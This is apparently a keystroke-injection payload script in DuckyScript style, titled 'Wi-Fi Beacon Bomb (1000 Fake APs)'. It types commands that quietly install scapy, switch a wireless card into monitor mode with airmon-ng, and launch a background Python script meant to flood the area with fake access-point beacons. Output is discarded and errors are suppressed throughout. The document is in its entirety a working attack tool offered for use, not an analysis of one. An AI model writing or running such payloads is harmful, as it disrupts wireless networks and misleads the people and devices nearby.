REM ================================================
REM Title: Wi-Fi Beacon Bomb (1000 Fake APs)
REM Author: turkkat284
REM Description: Sets monitor mode and launches core/core.py
REM ================================================

EXTENSION PASSIVE_RECON

# Variables
VAR $IFACE = "wlan0"
VAR $MON_IFACE = "wlan0mon"
VAR $PAYLOAD_DIR = "/root/payloads/wifi_bomb"

LOG_INFO "Starting Wi-Fi Bomb Setup..."

FUNCTION PREPARE_ENVIRONMENT()
    # Attempt to ensure pip is available, then install scapy (best-effort)
    STRING apt-get update > /dev/null 2>&1 || true
    STRING apt-get install -y python3-pip > /dev/null 2>&1 || true
    STRING python3 -m pip install --upgrade pip > /dev/null 2>&1 || true
    STRING python3 -m pip install scapy > /dev/null 2>&1 || true

    # Put interface into monitor mode (requires airmon-ng from aircrack-ng)
    STRING airmon-ng start $IFACE > /dev/null 2>&1 || true
    ENTER
END_FUNCTION

FUNCTION RUN_CORE()
    # Ensure payload directory exists and run the script. We pass the monitor interface via env var.
    STRING cd $PAYLOAD_DIR && nohup env WIFI_BOMB_IFACE=$MON_IFACE python3 core/core.py > /dev/null 2>&1 &
    ENTER
END_FUNCTION

LED_ATTACK
PREPARE_ENVIRONMENT
DELAY 2000

LOG_INFO "Launching core/core.py in background..."
RUN_CORE

LED_FINISH
